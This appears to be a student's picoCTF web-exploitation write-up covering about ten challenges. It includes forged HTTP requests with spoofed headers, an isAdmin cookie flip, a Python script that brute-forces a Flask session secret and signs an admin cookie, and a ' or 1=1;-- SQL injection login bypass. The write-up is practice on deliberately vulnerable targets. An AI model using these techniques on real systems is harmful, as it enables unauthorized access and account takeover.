**WEB EXPLOITATION**

PICOCTF

1\.Inspect Element

- Found the flag in the body tab of website when I inspected it.
- Anyways they should have kept the flag hidden in head tab then it would have related to Histiaeus as he hid messages on the head

2\.Intro To Burp

- Did a lightweight scan on website using burp(have professional version somehow)
- Didn’t find anything except one session cookie
- So registered while intercept was on 
- Forwarded it and did the same for otp form also
- Deleted otp= from request and got the flag

3\.Dont-use-client-side

- A verify function was given where flag was split in pieces of four
- Simple reconstruction- picoCTF{no\_clients\_plz\_b706c5}

4\.Where are The robots

- Obviously the creator would not want us to look at robots.txt
- Found / Disallow: /1bb4c.html
- Found the flag there

5\.SQL direct

- After downloading psql and connecting it, I had to google some basic commands
```bash
    (base) mehul@Mehuls-MacBook-Air ~ % psql -h saturn.picoctf.net -p 54826 -U postgres
Password for user postgres: 
psql (14.13 (Homebrew), server 15.2 (Debian 15.2-1.pgdg110+1))
WARNING: psql major version 14, server major version 15.
         Some psql features might not work.
Type "help" for help.

6\.Some assembly Required-1
- found that it was interacting with /G82XCw5CX3.js 
- when i opened the js i found /JIFxzHyW8W some obsure wasm probably
- using some wasm decompilers(it didnt even require that) i found the flag

7\.Who are you?
- Honestly the best challenge i have come across till now
- had to use some help but learnt a lot
- this is the orignal get request:
```bash
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
- first had to change the useragent to PicoBrowser as it said only PicoBrowser is allowed
- Then i said it didnt trust users from other sites so had to cahnge the referer to the host only which is Referer: mercury.picoctf.net:52362
- Then it said site worked only in 2018 so i added Date: Wed, 21 Oct 2018 07:28:00 GMT
- Then had to make the request untarckable by DNT:1
- then it said the site worked only in sweden so i set the ip address for seden in X-Forwarded-For: 92.44.242.19
- finally  i also had to change the language to get the flag
- this is the final get request:
```bash
GET / HTTP/1.1
Host: mercury.picoctf.net:52362
Accept-Language: sv-sv,sv;q=0.9
Date: Wed, 21 Oct 2018 07:28:00 GMT
DNT:1
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: mercury.picoctf.net:52362
X-Forwarded-For: 92.44.242.19
Connection: keep-alive
```
8\.Power cookies
- Opened Burp Suite as usual while intercept was on
- when i clicked on continue as guest this was the get request 
``` bash 
GET /check.php HTTP/1.1
Host: saturn.picoctf.net:61613
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://saturn.picoctf.net:61613/
Accept-Encoding: gzip, deflate, br
Cookie: isAdmin=0
Connection: keep-alive
``` 
- i just changed cookie to 1 to get the flag

9\. Most Cookies
- downlaoded flask-unsign
- looked how server.py worked
- i bruteforced to find the valid cookie
```bash 
  from bs4 import BeautifulSoup
from subprocess import run
import requests

url = "http://mercury.picoctf.net:52134/"
session = requests.Session()
response = session.get(url)
cookie = session.cookies.get_dict().get('session')
cookie_names = [
    "snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", 
    "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", 
    "kiss", "biscotti", "butter", "spritz", "snowball", "drop", 
    "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", 
    "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", 
    "macaron", "black and white", "white chocolate macadamia"
]
with open('wordlist.txt', 'w') as f:
    for name in cookie_names:
        f.write(name + "\n")
result = run(
    ["flask-unsign", "--unsign", "--cookie", cookie, "--wordlist", "wordlist.txt"],
    capture_output=True, text=True
)
secret = result.stdout.strip()
if not secret:
    raise ValueError("Secret key was not found.")
payload = '{"very_auth": "admin"}'
sign_result = run(
    ["flask-unsign", "--sign", "--cookie", payload, "--secret", secret],
    capture_output=True, text=True
)
signed_cookie = sign_result.stdout.strip()
if not signed_cookie:
    raise ValueError("Failed to sign the cookie.")
cookies = dict(session=signed_cookie)
response = requests.get(url, cookies=cookies)
soup = BeautifulSoup(response.text, "html.parser")
flag = soup.select_one("body > div.container > div.jumbotron > p:nth-child(2)")
if flag:
    print(flag.get_text())
else:
    print("Flag not found on the page.")
```

10\. More sqli
- when i entered random info it showed
``` bash
username: mehul
password: mehul123
SQL query: SELECT id FROM users WHERE password = 'mehul123' AND username = 'mehul'
```
- so i tried sql injection
- put this as my password -'or 1=1;-- i got welcome screen
- got the flag in responce headers

11\.SOAP
